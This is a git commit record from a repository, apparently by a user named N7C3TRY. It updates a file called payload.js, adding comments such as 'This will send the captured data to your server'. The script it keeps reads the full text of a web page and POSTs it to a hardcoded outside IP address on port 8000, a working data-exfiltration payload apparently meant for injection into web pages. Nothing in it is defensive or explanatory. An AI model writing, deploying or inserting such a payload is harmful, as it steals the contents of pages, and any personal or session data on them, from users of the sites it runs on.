855e520acf50b2cdedd66efc4e3bdccb38fcfc84
N7C3TRY <45738080+N7C3TRY@users.noreply.github.com>
2025-04-06 22:25:44 -0500

    Update payload.js
    4

--- payload.js
+++ payload.js
@@ -1,6 +1,7 @@
+// This will send the captured data to your server
 let data = document.body.innerText;
-fetch("http://185.196.11.208:8000/log", {
+fetch("http://185.196.11.208:8000/log", {  // Send to your server
   method: "POST",
   body: "content=" + encodeURIComponent(data),
-  headers: {"Content-Type":"application/x-www-form-urlencoded"}
+  headers: { "Content-Type": "application/x-www-form-urlencoded" }
 });
